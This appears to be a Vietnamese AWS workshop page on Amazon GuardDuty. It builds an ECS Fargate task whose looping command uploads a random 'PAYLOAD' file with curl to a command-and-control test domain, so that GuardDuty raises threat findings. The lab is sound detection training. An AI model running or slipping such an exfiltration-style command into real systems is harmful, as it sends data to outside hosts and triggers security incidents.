---
title : "Tạo Task Độc Hại"
date :  "`r Sys.Date()`" 
weight : 4
chapter : false
pre: "<b> 4.4. </b>"
---

![alt text](/images/4-amazon-guardduty/4.4-create-malicious-task/image-2.png)
*Hình 1. Sơ đồ tạo task độc hại*

Trong phần này, chúng ta sẽ tạo một ECS task mô phỏng hoạt động trái phép để minh họa khả năng phát hiện mối đe dọa của Amazon GuardDuty. Task này sẽ cố gắng giao tiếp với một tên miền máy chủ điều khiển và chỉ huy đã biết và thực thi một tệp nhị phân được tạo ra.

Đầu tiên, tạo task definition:

```bash
cat << EOF > malicious-guardduty-taskdef.json
{
    "family": "malicious-guardduty-task",
    "networkMode": "awsvpc",
    "requiresCompatibilities": [
        "FARGATE"
    ],
    "cpu": "1024",
    "memory": "2048",
    "runtimePlatform": {
        "cpuArchitecture": "X86_64",
        "operatingSystemFamily": "LINUX"
    },
    "containerDefinitions": [
        {
            "name": "guardduty-test",
            "image": "public.ecr.aws/ubuntu/ubuntu:22.04",
            "portMappings": [],
            "essential": true,
            "entryPoint": [
                "sh",
                "-c"
            ],
            "command": [
                "while true; do sleep 30;apt update -y;apt install python3 curl gcc netcat-openbsd g++ sudo zip -y; dd if=/dev/random of=PAYLOAD bs=1024 count=1;curl -X POST -F \"file=@PAYLOAD\" -s --connect-timeout 1 http://c2.guarddutyc2activityb.com/sample.dat > /dev/null; echo \"done!\";sleep 60; done"
            ],
            "environment": [],
            "mountPoints": [],
            "volumesFrom": [],
            "linuxParameters": {
                "capabilities": {
                    "add": [
                        "SYS_PTRACE"
                    ],
                    "drop": []
                }
            },
            "privileged": false,
            "logConfiguration": {
                "logDriver": "awslogs",
                "options": {
                    "awslogs-group": "retail-store-ecs-tasks",
                    "awslogs-region": "${AWS_REGION}",
                    "awslogs-stream-prefix": "guardduty"
                }
            }
        }
    ],
    "executionRoleArn": "arn:aws:iam::${ACCOUNT_ID}:role/retailStoreEcsTaskExecutionRole",
    "taskRoleArn": "arn:aws:iam::${ACCOUNT_ID}:role/retailStoreEcsTaskRole"
}
EOF

aws ecs register-task-definition --cli-input-json file://malicious-guardduty-taskdef.json
```

Triển khai task vào ECS cluster của bạn:

```bash
aws ecs run-task \
    --cluster retail-store-ecs-cluster \
    --task-definition malicious-guardduty-task:1 \
    --launch-type FARGATE  \
    --network-configuration "awsvpcConfiguration={subnets=[${PRIVATE_SUBNET1},${PRIVATE_SUBNET2}],assignPublicIp=DISABLED}"
```

Theo dõi các Phát hiện của GuardDuty:

1. Điều hướng đến [Amazon GuardDuty console](https://console.aws.amazon.com/guardduty/home)
2. Đợi khoảng 3-5 phút để các phát hiện xuất hiện
3. Xem xét các cảnh báo bảo mật cho thấy hoạt động đáng ngờ

![Guardduty Console](/images/4-amazon-guardduty/4.4-create-malicious-task/image.png)
*Hình 2. GuardDuty Console*

Kiểm tra chi tiết các phát hiện:

![Guardduty Findings](/images/4-amazon-guardduty/4.4-create-malicious-task/image-1.png)
*Hình 3. Các Phát hiện của GuardDuty*

Amazon GuardDuty cung cấp ngữ cảnh chi tiết cho mỗi phát hiện bảo mật, bao gồm:
- Thông tin ECS cluster
- Chi tiết task
- Thông số container
- Các chỉ số đe dọa dựa trên IP và tên miền

Thông tin chi tiết này giúp các đội ngũ bảo mật nhanh chóng xác định và phản ứng với các mối đe dọa tiềm ẩn.

Để biết thêm thông tin về các phát hiện của GuardDuty và tài nguyên được giám sát, tham khảo [Hướng dẫn về các phát hiện của Amazon GuardDuty](https://docs.aws.amazon.com/guardduty/latest/ug/findings-runtime-monitoring.html).